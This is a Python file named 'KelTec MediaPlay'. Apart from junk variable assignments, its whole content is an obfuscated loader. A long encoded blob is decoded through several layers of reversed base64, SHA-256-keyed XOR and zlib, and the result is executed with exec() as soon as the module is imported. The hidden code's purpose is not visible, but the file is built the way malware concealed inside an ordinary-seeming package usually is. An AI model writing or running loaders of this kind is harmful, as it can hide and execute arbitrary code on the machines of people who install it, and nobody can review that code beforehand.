# -*- coding: utf-8 -*-
# KelTec MediaPlay

_lx0_0 = 248423 ^ 216813
_lx1_1 = len("f80e95")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-587704)
_lx3_3 = 709409 * 0
_lx4_4 = 585258 ^ 270053
_K = '5807b8f422257e0b5a559888acdc314aed55323ab39ee6611da780d907d84762'
_M = 'n3aLNLI3SiUq+jo37ltwtKFxRcvSLG8A3yiRAsq/L5aKMZ0w82ISYnapY2G5WCG/oXJBmId9agOGK89cmbQsxY1kwWP2YxRnJPkz'
_D = '==AIF/18wuvY58Em7ljISq45Q50IgHW8zvUgMGTcjBHk/qZir+f2XEgO73lRfDE+1WEYxlpxUsot3/nb6F/Fgtab1gbr/q61ma0vGyG2ZNw8JKSkV9NW7xPS4NXIHdGfZ0kqeyhRspaIWkSUWtIOkRyb60tZjSNWjeOgBFUHeg116yYhKIxXxUvW2B3bM6SSAz9jjIqW0M+JLZhy6cF1yr/3j8v9qmf/JxXBfVPOrMd4DP1Da9DcmKijbkxhPPAiLHa88/9rHkP5HgU+JUhHlUx0KXSjcy8B8siTArGJ4DrpoTyoLNXk3g6TbPMQJhZQ0YKOd0FaslDTPXCIVW4tLtJdEhmdLoRXqHkDVOgnEf96wrMEUY44H9ThmVUdAbC0VJWVdQ2avX41Po0MzcfiFtVuY8Dqa/Ak58ONxz4vzVGmwobY37Fx3ZoVdkdQiRZDgTdT/SBGNlwQZiQpRHWnA+P4W6Lauhz6I0e8lOLEUjUfkSRWMXFA1zqAC0ekfaNDdov/lDjJitUSAYXYBe+TO/aWhXC+v6tz9Sxv9UnzjhDrOtK+vN3/DjkQLFLlGT2K6dXZfl0rzB/bI9CP6RKGmjDNkYGwfa+KzdpIQGfGzHWKrH2UyHsKt34f1ivHYHPlScTMm0/sDINDi8AqHxIZBx+6yRqxPV0KeNkj9l41Hix5Y+M8Vjy9DL3Ha14+TQi/P3EuM9/yexBbXjS5memywiWbBrZ8c4bC6O/xtI+RXB2rrgM9KtLyXfivG9SScIrUlonykrSE4cbDPA+lP51DpnHdfV74YsEiK1Bp/WvyTo76E8vfzdoYckw4+ls3/wFhYsdiAzFMbzChxSydOanvQqfCLfHP/dhHGmW6MkbK0LtAnqU0UXZyjtR4zp19SkFmBdIno/TN8fgeKGAaGAZW3fM/yuVwqu3yfqtrLMg7bNK7PfVq9rH6M0JHmNhc8ohXTrfAtPaBABEOL7Bzf1EPT9dhHNqQj7vZKowMJZ3xeG4wHM6r5qRcvDwg14o0KBHXIySBV/80cP6/jYPfcZ28Mimm6Z6KJFXwOThXOaDW4nqAuDzleXtedbLcuFCYWhmpYdAwdBkY+dtP5/ksuAkxWYTZN3EkidpOtXwj7fBUneYkfTiyzwQH3fHj1NBF0pcgeHhzOcbxgvW6jsqM7+8sbTENnIEK7WhoxbxY2LXmlBzuWQgCnZcbqI9AbHRBXi/4dWM1VjF5g/64MTaueNquKKavqp7/5TxaaOnhbj5ObeuayLXDH6/9k1C/NkME3SBIrREVj/rhOkMI0TaN6nbSSqvSiEtDwN9VPXu+pQjWV4gAVG7nKpFQrxcms+WHEGltkkCJWQe3fLP3hkaYK+G42/7LV4nlTLBjYhP2gw/BSR7Z5YF5CPh97gRFrenrLwbg/+dEbP4LA8AkIGDfhp4tpIQXTo4IAT3bfezwCnm4bSTv0bEc2hhKTLHMdMx9CjK5ZXIu0i/W944uOJ1tTiIAgKwLdPP21IY/hJHQR8d8GgQ27Sq7kIc2bXdovsQKD/usT1r8ejLaToyl6hsqCVtL4uTu7DDq2Ywu8pORkw32l+PaHnW0dMR9wqD1BfyDKVoN6UqFn+X5E6NWXsURsryyxj9SurwFomBI7641cMuzCzkRuiIdNtw1YRq1rgbTgpQrG7miPCqWnpZo2oWd7t4JY607ZIn/gEGzEHN+8OV+fZoLow7f8uJNi4JQvE5WCCywR4qtMTQ5CY4Pu/LQPP4lchqvrSt82DHHY1tvTChqH6SWedEvN7yNnlAr9cdUaNLXmNUPzMER/nj97HfmNohh4givlq3nfQRqWopnLReY7hwfYoUHI50GnGkr'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})